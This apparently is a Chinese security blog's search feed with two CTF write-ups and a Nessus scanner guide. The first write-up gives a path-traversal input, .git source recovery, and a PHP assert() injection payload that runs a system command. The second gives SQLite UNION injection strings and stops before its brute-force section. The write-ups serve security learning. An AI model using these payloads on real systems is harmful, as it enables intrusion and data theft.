src="https://i.imgur.com/Qutnt0L.png" alt></p><p>于是我们尝试用文件包含来获取密码信息</p><pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p><p>看到about页面说使用了git</p><p><img src="https://i.imgur.com/qHNE2ot.png" alt></p><p>想到.git源码泄露，访问.git文件，发现可以访问</p><p><img src="https://i.imgur.com/V87suOa.png" alt></p><p>我们使用 工具GitHack将网站源码clone下来。</p><blockquote><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></blockquote><p>GitHack的工作原理是</p><blockquote><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p></blockquote><p>使用命令：</p><pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p><pre><code>&lt;?php// TODO// $FLAG = &apos;&apos;;?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p><pre><code>&lt;?phpif (isset($_GET[&apos;page&apos;])) {$page = $_GET[&apos;page&apos;];} else {    $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &apos;..&apos; is dangerous!assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p><p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p><p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p><p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p><pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p><p>大神就是大神！</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nessus 使用指南</title>
      <link href="/2018/02/23/Nessus%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2018/02/23/Nessus%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>NESSUS 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用NESSUS 作为扫描该机构电脑系统的软件。</p><a id="more"></a><h1 id="Nessus-使用指南"><a href="#Nessus-使用指南" class="headerlink" title="Nessus 使用指南"></a>Nessus 使用指南</h1><h2 id="0x01创建策略"><a href="#0x01创建策略" class="headerlink" title="0x01创建策略"></a>0x01创建策略</h2><p>进入主页面后点击policies</p><p><img src="https://i.imgur.com/UKPKn8z.png" alt></p><p>然后创建一个新策略</p><p><img src="https://i.imgur.com/kcgt20y.png" alt></p><p>进去后会有已经列出的策略选项，我们点击Advanced Scan，高级扫描</p><p><img src="https://i.imgur.com/Gq2m3ET.png" alt></p><h2 id="0x02配置策略"><a href="#0x02配置策略" class="headerlink" title="0x02配置策略"></a>0x02配置策略</h2><p>在Advanced Scan中会看到除了Credentials(登录扫描)还多了两项Compliance(合规性检测)和Plugins(扫描插件)配置。</p><p><img src="https://i.imgur.com/3942etv.png" alt></p><p>在这里我们进行常规的的配置。</p><h2 id="0x03高级配置"><a href="#0x03高级配置" class="headerlink" title="0x03高级配置"></a>0x03高级配置</h2><p>由于其他配置与基础扫描时一致的所以，现在重点介绍下高级扫描的DISCOVERY，ASSESSMENT，Credentials首先是DISCOVERY，这个栏目包含Host Discovery(主机发现)，Port Scanning(端口发现)，Service Discovery(服务发现)。主机发现中一般要开启Ping功能其他的需要按照需求进行配置，比较全面的扫描建议勾选Ping Methods中UDP选项，会降低效率,和准确性，由于日常资产收集只对服务器进行资产统计，不对网络设备和打印机等进行统计，所以Fragile Devices中的内容不进行设置。</p><p><img src="https://i.imgur.com/kgFBF1n.png" alt></p><p><img src="https://i.imgur.com/lyNUsGP.png" alt></p><p>接下来进行端口扫描，在进行常规扫描时我们按照默认的设置就可以完成扫描，需要进行全部端口的扫描或者进行防火墙探测时我们就需要自定义参数</p><p><img src="https://i.imgur.com/FV29K9J.png" alt="端口扫描"></p><p>接下来的服务发现我们也需要将发现范围设置为全部端口以提高准确率</p><p><img src="https://i.imgur.com/t22LNhe.png" alt></p><p>下面的ASSESSMENT(安全认证)/Genereal一般不需设置，这里就省略。</p><p>Brute Force 勾选General Settings可以防止账号被锁定。</p><p><img src="https://i.imgur.com/TDQot05.png" alt></p><p> 在Settings / assessment / Web Applications，可以对Web应用进行测试，可以根据实际需求进行配置。</p><p><img src="https://i.imgur.com/IDjSxs4.png" alt></p><p>Windows选项中可以枚举SMB域，一般使用默认配置。</p><p>在REPORT中只需设置报告的详细程度</p><p><img src="https://i.imgur.com/6PGS6CP.png" alt></p><p>在Credentials中我们可以进行登陆扫描</p><p><img src="https://i.imgur.com/cTbfXjS.png" alt></p><p>在Plugins中我们可以进行具体的插件选择</p><p><img src="https://i.imgur.com/SREIZoC.png" alt></p><p>点击SAVE后我们新建一个扫描</p><p><img src="https://i.imgur.com/Vgc0e1i.png" alt></p><p><img src="https://i.imgur.com/UHO2Yt8.png" alt></p><p>点击Launch开始扫描</p><h2 id="生成结果报告"><a href="#生成结果报告" class="headerlink" title="生成结果报告"></a>生成结果报告</h2><p>查看已完成的扫描可以看到具体的漏洞信息</p><p><img src="https://i.imgur.com/gDNENXH.png" alt></p><p>将结果导出</p><p><img src="https://i.imgur.com/PDT3Ran.png" alt></p><p>在生成的报告中我们可以看到相关信息</p><p><img src="https://i.imgur.com/OjRYT2I.png" alt></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>Nessus是一款非常强大的漏洞扫描与分析软件，我们甚至可以找到某一个漏洞的CVE号来进行针对与某一具体已公布的漏洞来进行扫描。</p><p>需要注意的是在进行扫描之前我们应该有目的的进行扫描，如果盲目的扫不仅浪费时间而且扫描的结果并不好。</p><p>这里给出几个公布漏洞的网站，方便查询：</p><ul><li><blockquote><p><a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a></p><p><a href="https://bugs.leavesongs.com/" target="_blank" rel="noopener">https://bugs.leavesongs.com/</a></p><p><a href="https://wooyun.website/" target="_blank" rel="noopener">https://wooyun.website/</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackLu FlatScience WP</title>
      <link href="/2017/03/23/HackLu-Flatscience-WP/"/>
      <url>/2017/03/23/HackLu-Flatscience-WP/</url>
      
        <content type="html"><![CDATA[<p>its so hard for me to write script!</p><a id="more"></a><h1 id="HackLu-FlatScience-WP"><a href="#HackLu-FlatScience-WP" class="headerlink" title="HackLu FlatScience WP"></a>HackLu FlatScience WP</h1><hr><h2 id="0x01-用到的东西"><a href="#0x01-用到的东西" class="headerlink" title="0x01 用到的东西"></a>0x01 用到的东西</h2><ol><li>robots.txt</li><li>对sqlite数据库了解</li><li>代码审计</li><li>sql注入</li><li>python写爆破脚本</li></ol><h2 id="0x02-robots-txt"><a href="#0x02-robots-txt" class="headerlink" title="0x02 robots.txt"></a>0x02 robots.txt</h2><p>刚拿到题确实一筹莫展，没什么经验。查看robots文件之后尝试登录./login.php</p><p><img src="https://i.imgur.com/E9wLCCI.png" alt="robots.txt"></p><p><img src="https://i.imgur.com/kJafN4R.png" alt="login.php"></p><h2 id="0x03-SQLite-数据库结构"><a href="#0x03-SQLite-数据库结构" class="headerlink" title="0x03 SQLite 数据库结构"></a>0x03 SQLite 数据库结构</h2><ol><li><p>SQLite3数据库Sql_master表结构</p><ol><li><p>储存在根页中，是系统表，与mysql中的information_schema表类似，储存了该数据库中各个表的信息的建表SQL语句。</p></li><li><p>如图<img src="https://i.imgur.com/lSrD5AX.png" alt="SQLite3结构"></p></li><li><p>基础的查询语句有<br><code>select * from sqlite_master WHERE type=&quot;table&quot;;</code> 可以查询到当前数据库中所有表的详细信息。</p><h2 id="0x04-代码审计"><a href="#0x04-代码审计" class="headerlink" title="0x04 代码审计"></a>0x04 代码审计</h2><p>传入debug之后得到源码</p><p><a href="http://111.198.29.45:30157/login.php?debug" target="_blank" rel="noopener">http://111.198.29.45:30157/login.php?debug</a></p><?phpif(isset($_POST['usr']) && isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");if($res){ $row = $res->fetchArray();}else{ echo "<br>Some Error occourred!";}if(isset($row['id'])){     setcookie('name',' '.$row['name'], time() + 60, '/');     header("Location: /");     die();}}if(isset($_GET['debug']))highlight_file('login.php');?><p> </p></li></ol></li></ol><p>可以看出使用了SQLite3数据库，对post的参数没有过滤直接进行了查询。如果查询到了id就执行setcookie操作，将name字段内容加进cookie里，时间+60s。所以我们可以尝试POST参数注入。</p><p>  <code>usr=admin&#39; union select name,sql from sqlite_master limit 1,1--+&amp;pw=admin</code></p><p>这时执行的查询语句就变成了这样</p><p><code>SELECT id,name from Users where name=&#39;admin&#39; union select name,sql from sqlite_master limit 1,1-- and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;</code><br>查看返回的cookie，name的value是查到的sql建表语句，id是查到的name.</p><p><img src="https://i.imgur.com/NnolACR.png" alt="cookie的值"><br>可以看出数据库的结构是</p><pre><code> CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code></pre><p>这样就知道了表名和字段名，接下来就可以得到内容</p><pre><code>    &apos; union select id,name from Users limit 0,1&apos; union select id,password from Users limit 0, 1&apos; union select id,hint from Users limit 0,1</code></pre><p>具体内容如下<br><img src="https://i.imgur.com/ynG34iE.png" alt></p><p>尝试CMD5破解admin的密码，没查出来，根据hint用网站的pdf里面的词爆破。（也可以看到密码进行了SHA1+salt的加密）</p><h2 id="0x05-python爆破"><a href="#0x05-python爆破" class="headerlink" title="0x05 python爆破"></a>0x05 python爆破</h2>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
